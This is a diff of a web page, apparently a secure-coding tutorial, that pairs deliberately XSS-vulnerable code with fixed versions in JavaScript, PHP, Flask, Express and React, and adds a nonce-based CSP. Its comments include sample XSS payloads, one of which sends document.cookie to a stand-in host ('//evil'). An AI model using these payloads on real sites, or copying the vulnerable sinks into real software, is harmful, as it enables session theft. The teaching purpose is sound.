@@ -217,39 +217,232 @@
         <div class="content">
             <h1>XSS Code Examples</h1>
 
-<h2>Vulnerable vs Secure</h2>
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#how-to-read">How to Read These Examples</a></li>
+<li><a href="#ex1-frontend">1. Front-End DOM Sinks (Vanilla JS)</a></li>
+<li><a href="#ex2-php">2. Reflected &amp; Stored XSS (PHP)</a></li>
+<li><a href="#ex3-python">3. Templates &amp; Sanitization (Python/Flask)</a></li>
+<li><a href="#ex4-node">4. Server-Rendered HTML (Node/Express)</a></li>
+<li><a href="#ex5-react">5. Framework Escape Hatches (React)</a></li>
+<li><a href="#ex6-csp">6. Wiring a Nonce-Based CSP</a></li>
+<li><a href="#summary">Summary of Fixes</a></li>
+</ul>
+</div>
 
-<strong>❌ VULNERABLE:</strong>
+<h2 id="how-to-read">How to Read These Examples</h2>
 
-<p>``<code>python</p>
-<p>@app.route('/comment', methods=['POST'])</p>
-<p>def post_comment():</p>
-<p>    comment = request.form['comment']</p>
-<p>    # Stored in DB without sanitization</p>
-<p>    db.insert({'comment': comment})</p>
-    
-<p>    # Displayed without escaping</p>
-<p>    return f"<div>{comment}</div>"</p>
-</code>`<code>
+<p>Each pair shows the same feature implemented insecurely and then securely. The pattern is always the same: the vulnerable version writes untrusted data into a page (or a code sink) verbatim; the secure version <em>encodes for the output context</em>, <em>sanitizes</em> when rich HTML is genuinely needed, or <em>uses a safe API</em> that treats data as text. Payloads below are shown as escaped text and will not execute.</p>
 
-<strong>✅ SECURE:</strong>
+<h2 id="ex1-frontend">1. Front-End DOM Sinks (Vanilla JS)</h2>
 
-</code>`<code>python
-<p>from markupsafe import escape</p>
-<p>import bleach</p>
+<h3>Vulnerable: <code>innerHTML</code> fed from the URL</h3>
 
-<p>@app.route('/comment', methods=['POST'])</p>
-<p>def post_comment():</p>
-<p>    comment = request.form['comment']</p>
-    
-<p>    # Sanitize input</p>
-<p>    clean_comment = bleach.clean(comment)</p>
-<p>    db.insert({'comment': clean_comment})</p>
-    
-<p>    # Escape output</p>
-<p>    return render_template('comment.html', </p>
-<p>                         comment=clean_comment)</p>
-</code>``
+<pre><code>// Renders a "greeting" from the URL fragment
+const name = decodeURIComponent(location.hash.slice(1));
+document.getElementById('greeting').innerHTML = 'Hello, ' + name;
+
+// Attack:  https://app.example/#&lt;img src=x onerror=alert(document.cookie)&gt;
+// innerHTML parses the payload as HTML -&gt; onerror fires -&gt; DOM XSS.</code></pre>
+
+<h3>Secure: treat data as text with <code>textContent</code></h3>
+
+<pre><code>const name = decodeURIComponent(location.hash.slice(1));
+document.getElementById('greeting').textContent = 'Hello, ' + name;
+// textContent never parses HTML; the payload shows as literal text.
+
+// If you MUST render user HTML, sanitize it first:
+import DOMPurify from 'dompurify';
+box.innerHTML = DOMPurify.sanitize(userSuppliedHtml);</code></pre>
+
+<h3>Vulnerable vs. secure sink table</h3>
+
+<table>
+<thead>
+<tr><th>Vulnerable</th><th>Secure</th></tr>
+</thead>
+<tbody>
+<tr><td><code>el.innerHTML = data</code></td><td><code>el.textContent = data</code></td></tr>
+<tr><td><code>document.write(data)</code></td><td><code>el.append(document.createTextNode(data))</code></td></tr>
+<tr><td><code>eval(data)</code></td><td><code>JSON.parse(data)</code></td></tr>
+<tr><td><code>setTimeout('f('+data+')')</code></td><td><code>setTimeout(() =&gt; f(data), 0)</code></td></tr>
+<tr><td><code>a.href = data</code></td><td><code>a.href = /^https?:/.test(data) ? data : '#'</code></td></tr>
+</tbody>
+</table>
+
+<h2 id="ex2-php">2. Reflected &amp; Stored XSS (PHP)</h2>
+
+<h3>Vulnerable: reflected search + stored comment</h3>
+
+<pre><code>&lt;?php
+// Reflected: query echoed straight into HTML
+echo "&lt;h1&gt;Results for: " . $_GET['q'] . "&lt;/h1&gt;";
+
+// Stored: comment saved and later printed raw
+$pdo-&gt;prepare("INSERT INTO comments (body) VALUES (?)")
+    -&gt;execute([$_POST['body']]);
+// ...later...
+foreach ($rows as $r) { echo "&lt;li&gt;" . $r['body'] . "&lt;/li&gt;"; }
+?&gt;
+// Attack q or body: &lt;script&gt;new Image().src='//evil/c?'+document.cookie&lt;/script&gt;</code></pre>
+
+<h3>Secure: encode on output with <code>htmlspecialchars</code></h3>
+
+<pre><code>&lt;?php
+// A single helper used at every output point
+function h($s) {
+    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+}
+
+// Reflected
+echo "&lt;h1&gt;Results for: " . h($_GET['q']) . "&lt;/h1&gt;";
+
+// Stored: store raw, ENCODE when rendering
+foreach ($rows as $r) { echo "&lt;li&gt;" . h($r['body']) . "&lt;/li&gt;"; }
+
+// Attribute context also needs ENT_QUOTES:
+echo '&lt;input value="' . h($_GET['q']) . '"&gt;';
+?&gt;
+// The payload now renders as inert text: &amp;lt;script&amp;gt;...</code></pre>
+
+<h2 id="ex3-python">3. Templates &amp; Sanitization (Python/Flask)</h2>
+
+<h3>Vulnerable: manual string building + <code>| safe</code></h3>
+
+<pre><code>@app.route('/comment', methods=['POST'])
+def post_comment():
+    comment = request.form['comment']
+    db.insert({'comment': comment})            # stored raw
+    return f"&lt;div&gt;{comment}&lt;/div&gt;"             # echoed raw -&gt; XSS
+
+# And in a template, the escape hatch reintroduces the bug:
+#   &lt;div&gt;{{ comment | safe }}&lt;/div&gt;   &lt;!-- disables autoescaping --&gt;</code></pre>
+
+<h3>Secure: rely on Jinja2 autoescaping; sanitize only rich HTML</h3>
+
+<pre><code>from flask import render_template, request
+import nh3   # allow-list HTML sanitizer (ammonia bindings)
+
+@app.route('/comment', methods=['POST'])
+def post_comment():
+    raw = request.form['comment']
+    # Store canonical data. If this field is PLAIN text, store as-is
+    # and let the template escape it. If it is RICH text, sanitize:
+    clean = nh3.clean(raw, tags={'b','i','em','strong','a','p'},
+                           attributes={'a': {'href','title'}})
+    db.insert({'comment': clean})
+    return render_template('comment.html', comment=clean)
+
+# comment.html (autoescape is ON by default in Flask/Jinja2):
+#   &lt;div&gt;{{ comment }}&lt;/div&gt;        &lt;!-- plain text: escaped, safe --&gt;
+#   &lt;div&gt;{{ comment | safe }}&lt;/div&gt; &lt;!-- ONLY because nh3 already cleaned it --&gt;</code></pre>
+
+<blockquote>
+<p>Note the discipline: for plain-text fields, do nothing special&mdash;let autoescaping work. Reach for <code>| safe</code> <em>only</em> in combination with a real sanitizer, never on raw user input.</p>
+</blockquote>
+
+<h2 id="ex4-node">4. Server-Rendered HTML (Node/Express)</h2>
+
+<h3>Vulnerable: template literal with raw input</h3>
+
+<pre><code>app.get('/hello', (req, res) =&gt; {
+  // req.query.name flows straight into HTML
+  res.send(`&lt;h1&gt;Hello ${req.query.name}&lt;/h1&gt;`);
+});
+// Attack: /hello?name=&lt;script&gt;steal()&lt;/script&gt;</code></pre>
+
+<h3>Secure: auto-escaping template engine + encoding helper</h3>
+
+<pre><code>// Option A: an auto-escaping view engine (e.g. Nunjucks, EJS with &lt;%= %&gt;)
+//   Nunjucks escapes {{ name }} by default:
+//     &lt;h1&gt;Hello {{ name }}&lt;/h1&gt;
+app.get('/hello', (req, res) =&gt; {
+  res.render('hello', { name: req.query.name });  // escaped by the engine
+});
+
+// Option B: explicit context-aware encoding when concatenating
+const esc = s =&gt; String(s)
+  .replace(/&amp;/g,'&amp;amp;').replace(/&lt;/g,'&amp;lt;').replace(/&gt;/g,'&amp;gt;')
+  .replace(/"/g,'&amp;quot;').replace(/'/g,'&amp;#39;');
+
+app.get('/hello', (req, res) =&gt; {
+  res.type('html').send(`&lt;h1&gt;Hello ${esc(req.query.name)}&lt;/h1&gt;`);
+});</code></pre>
+
+<h2 id="ex5-react">5. Framework Escape Hatches (React)</h2>
+
+<h3>Vulnerable: <code>dangerouslySetInnerHTML</code> with user input</h3>
+
+<pre><code>function Bio({ bio }) {
+  // Bypasses React's automatic escaping entirely
+  return &lt;div dangerouslySetInnerHTML={{ __html: bio }} /&gt;;
+}
+// If `bio` is user-controlled, any markup executes.</code></pre>
+
+<h3>Secure: default escaping, or sanitize when HTML is required</h3>
+
+<pre><code>// Plain text: just interpolate &mdash; React escapes it.
+function Bio({ bio }) {
+  return &lt;div&gt;{bio}&lt;/div&gt;;              // safe, escaped
+}
+
+// Genuinely rich HTML: sanitize before injecting.
+import DOMPurify from 'dompurify';
+function RichBio({ bioHtml }) {
+  const clean = DOMPurify.sanitize(bioHtml);
+  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;
+}
+
+// URL props need scheme validation too:
+const href = /^https?:/i.test(user.url) ? user.url : '#';
+return &lt;a href={href}&gt;site&lt;/a&gt;;         // blocks javascript: URLs</code></pre>
+
+<h2 id="ex6-csp">6. Wiring a Nonce-Based CSP</h2>
+
+<p>Even with correct encoding, a strict CSP is the safety net that neutralizes any injection that slips through. Below, a per-request nonce is generated and every legitimate inline script is tagged with it; anything the attacker injects lacks the nonce and is blocked.</p>
+
+<pre><code>// Express + a fresh nonce per response
+const crypto = require('crypto');
+
+app.use((req, res, next) =&gt; {
+  res.locals.nonce = crypto.randomBytes(16).toString('base64');
+  res.setHeader('Content-Security-Policy',
+    "default-src 'self'; " +
+    `script-src 'nonce-${res.locals.nonce}' 'strict-dynamic'; ` +
+    "object-src 'none'; base-uri 'none'");
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  next();
+});
+
+// In the template, legitimate scripts carry the nonce:
+//   &lt;script nonce="{{ nonce }}"&gt; ... &lt;/script&gt;
+// An injected &lt;script&gt; (no nonce) is refused by the browser.</code></pre>
+
+<h2 id="summary">Summary of Fixes</h2>
+
+<table>
+<thead>
+<tr><th>Symptom</th><th>Root cause</th><th>Fix</th></tr>
+</thead>
+<tbody>
+<tr><td>Payload runs from URL/DOM</td><td><code>innerHTML</code>/<code>eval</code> sink</td><td><code>textContent</code>; sanitize with DOMPurify</td></tr>
+<tr><td>Reflected/stored HTML runs</td><td>Unescaped server output</td><td>Context-aware encoding (<code>htmlspecialchars</code>, autoescape)</td></tr>
+<tr><td>Rich-text field runs script</td><td>Raw HTML trusted</td><td>Allow-list sanitizer (DOMPurify/nh3)</td></tr>
+<tr><td>Framework hole</td><td><code>dangerouslySetInnerHTML</code>/<code>| safe</code>/<code>v-html</code></td><td>Remove hatch, or sanitize first</td></tr>
+<tr><td><code>javascript:</code> link fires</td><td>Unvalidated URL</td><td>Allow-list <code>http/https/mailto</code> schemes</td></tr>
+<tr><td>Any injection executes</td><td>No runtime backstop</td><td>Nonce-based CSP + Trusted Types; <code>HttpOnly</code> cookies</td></tr>
+</tbody>
+</table>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="overview.html">Overview</a></strong>: Types, impact, and misconceptions</li>
+<li><strong><a href="attack-vectors.html">Attack Vectors</a></strong>: The contexts and sinks these fixes address</li>
+<li><strong><a href="prevention.html">Prevention</a></strong>: The full layered defense strategy</li>
+<li><strong><a href="./lab/cross-site-scripting/">Hands-On Lab</a></strong>: Practice turning vulnerable code into secure code</li>
+</ul>
 
         </div>
     </div>
